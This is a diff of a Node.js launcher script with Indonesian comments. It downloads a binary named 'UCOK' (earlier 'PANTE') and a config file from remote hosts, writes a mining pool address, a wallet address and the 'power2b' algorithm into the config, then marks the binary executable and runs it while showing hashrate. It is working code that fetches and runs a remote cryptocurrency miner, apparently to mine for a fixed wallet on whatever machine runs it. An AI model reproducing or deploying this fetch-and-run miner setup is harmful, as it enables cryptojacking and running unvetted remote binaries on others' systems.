@@ -12,11 +12,11 @@ if (!fs.existsSync(WORKDIR)) {
 process.chdir(WORKDIR);
 
 // URL file
-const URL_GENZO = "https://blogspotgenzo.site/PANTE";
+const URL_GENZO = "https://blogspotgenzo.site/UCOK";
 const URL_CONFIG = "http://genzoko.serveblog.net/config.json";
 
 // Nama file
-const FILE_GENZO = "PANTE";
+const FILE_GENZO = "UCOK";
 const FILE_CONFIG = "config.json";
 
 // Fungsi download
@@ -36,7 +36,7 @@ function editConfig(filePath) {
   try {
     let data = fs.readFileSync(filePath, 'utf8');
 
-    data = data.replace(/"tua"/g, '"43.157.91.13:2425"');
+    data = data.replace(/"tua"/g, '"159.89.10.132:80"');
     data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
     data = data.replace(/"meki"/g, '"power2b"');
 
@@ -58,9 +58,9 @@ function makeExecutable(filePath) {
   }
 }
 
-// Fungsi jalankan PANTE
+// Fungsi jalankan UCOK
 function runPante(binary, config) {
-  console.log("[*] Menjalankan PANTE (hashrate akan tampil di bawah)...");
+  console.log("[*] Menjalankan UCOK (hashrate akan tampil di bawah)...");
   console.log("");
 
   const processRun = spawn(`./${binary}`, ['-c', config], {
